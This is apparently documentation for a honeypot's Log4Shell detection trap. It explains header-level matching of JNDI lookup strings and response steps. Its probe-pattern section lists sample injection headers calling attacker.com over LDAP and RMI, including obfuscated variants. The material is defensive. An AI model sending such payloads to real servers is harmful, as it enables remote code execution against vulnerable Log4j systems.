---
title: Log4Shell
parent: Attack Traps
nav_order: 10
---

# Log4Shell Detection
{: .no_toc }

**CVE-2021-44228** — Log4Shell is one of the most severe vulnerabilities in recent history (CVSS 10.0). It affects Apache Log4j 2 versions 2.0-beta9 through 2.14.1 and allows unauthenticated Remote Code Execution via a simple JNDI lookup string in any logged field.

---

## How detection works

Unlike other traps that match on URL paths, Log4Shell detection is **header-level** and applies to **every request**.

The honeypot scans all request headers and the URL query string for the JNDI injection pattern:

```
${jndi:
```

If found, `attack_tag` is set to `log4shell` **before** the normal path-based routing. This means a Log4Shell probe to `/wp-login.php` gets both `wp-login` as the original tag and `log4shell` as the tag (Log4Shell takes priority).

---

## Common probe patterns

Attackers embed JNDI lookups in headers like:

```
User-Agent: ${jndi:ldap://attacker.com/a}
X-Forwarded-For: ${jndi:ldap://attacker.com/a}
Referer: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}
X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.com/a}
```

The honeypot's detection is case-insensitive and catches all of these.

---

## What to do with Log4Shell hits

In your webhook routing, treat `log4shell` hits as high priority:

1. Immediately block the source IP at your firewall.
2. Alert your security team via Slack or PagerDuty.
3. Check whether the attacker IP appears in any of your real application logs.

Log4Shell scanning never stopped — automated botnets continue probing millions of IPs daily for this vulnerability.
